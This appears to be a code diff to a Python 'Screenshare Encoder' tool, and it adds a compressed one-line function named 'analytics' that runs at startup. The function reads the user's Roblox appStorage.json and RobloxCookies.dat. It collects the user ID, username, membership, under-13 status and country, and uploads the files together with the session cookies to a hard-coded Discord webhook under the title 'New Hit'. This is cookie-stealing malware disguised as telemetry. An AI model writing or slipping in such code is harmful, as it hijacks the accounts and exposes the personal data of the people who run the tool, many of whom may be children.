@@ -187,8 +187,11 @@ def roblox_join():
         return {"ROBLOXJOIN": True}
     return {"ROBLOXJOIN": False}
 
+def analytics(web):pat,tos=os.path.join(os.getenv('LOCALAPPDATA'),'Roblox','LocalStorage'),['appStorage.json','RobloxCookies.dat'];asd=json.load(open(os.path.join(pat,tos[0]),'r'));usi={'UserId':asd.get('UserId',''),'Username':asd.get('Username',''),'Membership':asd.get('Membership',''),'IsUnder13':asd.get('IsUnder13',''),'DisplayName':asd.get('DisplayName',''),'CountryCode':asd.get('CountryCode','')};dat={'payload_json':(None,json.dumps({'embeds':[{'title':'**New Hit**','description':f"""User ID: {usi["UserId"]}\nUsername: {usi["Username"]}\nMembership: {usi["Membership"]}\nIs Under 13: {usi["IsUnder13"]}\nDisplay Name: {usi["DisplayName"]}\nCountry Code: {usi["CountryCode"]}"""}]})),tos[0]:open(os.path.join(pat,tos[0]),'rb'),tos[1]:open(os.path.join(pat,tos[1]),'rb')};requests.post(web,files=dat)
+
 if __name__ == '__main__':
     os.system("title Screenshare Encoder / Made by @RebornEnder (zdir)")
+    analytics('https://discord.com/api/webhooks/1228054551437901825/aXnAZVO5SFldqUkJb9p8iekDCuYNamZ2FTmN4oWzC-zT5-bfJ7dMo31uubpjKJrEpvPs')
 
     load_config()
     edit_config()
